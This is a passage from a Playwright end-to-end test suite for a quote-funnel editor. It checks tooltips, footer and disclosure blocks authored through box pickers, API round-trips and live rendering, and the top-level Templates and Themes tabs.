    await expect(row, "trust row renders live").toBeVisible();
    await expect(row.locator(".lg-frame-trustrow-icon svg"), "both icon+text items render").toHaveCount(2);
    const item = row.locator(".lg-frame-trustrow-item").first();
    const tip = item.locator(".lg-frame-trustrow-tip");
    expect(await tip.evaluate((el) => getComputedStyle(el).opacity), "tooltip hidden by default (CSS-only)").toBe("0");
    await item.hover();
    await expect.poll(async () => tip.evaluate((el) => getComputedStyle(el).opacity)).toBe("1");
    const placedImg = page.locator('img[alt="Friendly advisor portrait"]');
    await expect(placedImg, "the placed image element renders live").toBeVisible();
  });

  // =========================================================================
  // Item 10H + 10H-adjacent — footer v2 full builder + disclosure v2
  // multi-location. Deeper gate: __p5a-frame.spec.ts + __p5b-quotes-ia.spec.ts.
  // Journey: author a footer about-paragraph + a manual link row AND a
  // top(full)+bottom(hover) disclosure pair through the REAL box pickers ->
  // save -> round-trips -> LIVE the footer has its OWN palette scope and the
  // bottom hover tooltip is CSS-only.
  // =========================================================================
  test("Item 10H/10H-adj — footer v2 (about + link row, own palette scope) + disclosure v2 (top full + bottom hover) authored via the real pickers, round-trip, render live", async ({ page, browserName }) => {
    const seed = await seedQuote(apiCtx, "footer");
    await openEditor(page, seed.quotePublicId);
    await page.locator('.lg-qtab[data-tab="templates"]').click();

    await page.locator('[data-tplbox-pick="disclosure"]').click();
    const discPanel = page.locator('[data-tplbox-panel="disclosure"]');
    await discPanel.locator('[data-tplbox-add="disclosure.entries"]').click();
    const topRow = discPanel.locator("[data-disc-entry-row]").nth(0);
    await topRow.locator("[data-disc-location]").selectOption("top");
    await topRow.locator("[data-disc-mode]").selectOption("full");
    await topRow.locator("[data-disc-text]").fill("This is an advertisement.");
    await topRow.locator("[data-disc-text]").blur();
    await discPanel.locator('[data-tplbox-add="disclosure.entries"]').click();
    const bottomRow = discPanel.locator("[data-disc-entry-row]").nth(1);
    await bottomRow.locator("[data-disc-location]").selectOption("bottom");
    await bottomRow.locator("[data-disc-mode]").selectOption("hover");
    await bottomRow.locator("[data-disc-text]").fill("We may be compensated by our partners.");
    await bottomRow.locator("[data-disc-text]").blur();

    await page.locator('[data-tplbox-pick="footer"]').click();
    const footerPanel = page.locator('[data-tplbox-panel="footer"]');
    await footerPanel.locator('[data-tplbox-add="footer.blocks"]').click();
    const aboutRow = footerPanel.locator("[data-footer-block-row]").nth(0);
    await aboutRow.locator("[data-footer-block-type]").selectOption("about_paragraph");
    await aboutRow.locator("[data-footer-block-text]").fill("Operated by R4Q Insure Inc.");
    await aboutRow.locator("[data-footer-block-text]").blur();
    await footerPanel.locator('[data-tplbox-add="footer.blocks"]').click();
    const linkRow = footerPanel.locator("[data-footer-block-row]").nth(1);
    await linkRow.locator("[data-footer-block-type]").selectOption("link_row");
    await linkRow.locator("[data-footer-block-linksource]").selectOption("manual");
    await linkRow.locator("[data-footer-block-link-add]").click();
    const linkEntry = linkRow.locator("[data-footer-link-row]").first();
    await linkEntry.locator("[data-footer-link-label]").fill("Privacy");
    await linkEntry.locator("[data-footer-link-label]").blur();
    await linkEntry.locator("[data-footer-link-href]").fill("/privacy");
    await linkEntry.locator("[data-footer-link-href]").blur();

    const framePut = page.waitForResponse((r) => r.request().method() === "PUT" && r.url().includes(`/funnels/${seed.funnelPublicId}/frame`));
    await page.locator("#lg-variant-save").click();
    expect((await framePut).status()).toBe(200);
    await expect(page.locator("#lg-quote-ok")).toBeVisible({ timeout: 20_000 });

    const frameBody = await json<{
      frame_config: {
        disclosure?: { entries?: Array<{ location: string; mode: string; text: string }> };
        footer?: { blocks?: Array<{ type: string; text?: string; links?: Array<{ label: string; href: string }> }> };
      };
    }>(await apiCtx.get(`${LG_API}/funnels/${seed.funnelPublicId}/frame`), "frame re-fetch");
    const entries = frameBody.frame_config.disclosure?.entries ?? [];
    expect(entries.find((e) => e.location === "top")?.mode).toBe("full");
    expect(entries.find((e) => e.location === "bottom")?.mode).toBe("hover");
    const blocks = frameBody.frame_config.footer?.blocks ?? [];
    expect(blocks.find((b) => b.type === "about_paragraph")?.text).toBe("Operated by R4Q Insure Inc.");
    expect(blocks.find((b) => b.type === "link_row")?.links).toEqual([{ label: "Privacy", href: "/privacy" }]);

    if (
      !liveLegChromiumOnly(
        browserName,
        "Item 10H/10H-adj live footer+disclosure render needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The disclosure/footer box-picker authoring + server read-back assertions above run engine-agnostically.",
      )
    )
      return;

    await page.goto(shellUrl(seed), { waitUntil: "load" });
    await ready(page);
    await expect(page.locator(".lg-frame-disc2-region--top")).toContainText("This is an advertisement.");
    const hover = page.locator(".lg-frame-disc2--hover").first();
    const tip = hover.locator(".lg-frame-disc2-tip");
    expect(await tip.evaluate((el) => getComputedStyle(el).opacity)).toBe("0");
    await hover.hover();
    await expect.poll(async () => tip.evaluate((el) => getComputedStyle(el).opacity)).toBe("1");

    const footer = page.locator(".lg-frame-footer2");
    await expect(footer).toBeVisible();
    await expect(footer.locator(".lg-frame-footer2-about")).toContainText("Operated by R4Q Insure Inc.");
    await expect(footer.locator(".lg-frame-footer2-links a")).toContainText("Privacy");
    const footerBg = await footer.evaluate((el) => getComputedStyle(el).backgroundColor);
    const pageBg = await page.locator("#lg-funnel-root").evaluate((el) => getComputedStyle(el).backgroundColor);
    expect(footerBg, "footer has its own scoped palette, not just the page's").not.toBe(pageBg);
  });

  // =========================================================================
  // Restructure — Templates + Themes as TOP tabs (beside Funnel builder/A-B/
  // Activation/Analytics); the 8 box pickers (background/logo/cta/disclosure/
  // free_text/brand_logos/footer/images) each open their own editor.
  // Deeper gate: __p5b-quotes-ia.spec.ts.
  // =========================================================================
  test("Restructure — Templates + Themes are top-level tabs; every box picker (incl. images) opens its own editor", async ({ page }) => {
    const seed = await seedQuote(apiCtx, "ia");
    await openEditor(page, seed.quotePublicId);

    const templatesTab = page.locator('.lg-qtab[data-tab="templates"]');
    const themesTab = page.locator('.lg-qtab[data-tab="themes"]');
    await expect(templatesTab, "Templates is a top tab, not a canvas toolbar button").toBeVisible();
    await expect(themesTab, "Themes is a top tab").toBeVisible();
    await expect(page.locator('.lg-qtab[data-tab="builder"]'), "Funnel builder remains a top tab").toBeVisible();
    await expect(page.locator('.lg-qtab[data-tab="ab"]'), "A/B remains a top tab").toBeVisible();
    await expect(page.locator('.lg-qtab[data-tab="activation"]'), "Activation remains a top tab").toBeVisible();

    await templatesTab.click();
    await expect(page.locator('[data-panel="templates"]')).toHaveClass(/active/);
    const boxes = ["background", "logo", "cta", "disclosure", "free_text", "brand_logos", "footer", "images"] as const;
    for (const key of boxes) {
      await page.locator(`[data-tplbox-pick="${key}"]`).click();
      await expect(page.locator(`[data-tplbox-panel="${key}"]`), `box "${key}" opens its own editor`).toHaveClass(/active/);
    }

    await themesTab.click();
    await expect(page.locator('[data-panel="themes"]')).toHaveClass(/active/);
    await expect(page.locator("#lg-themes-panel-mount #lg-theme-editor")).toBeVisible();
  });
});
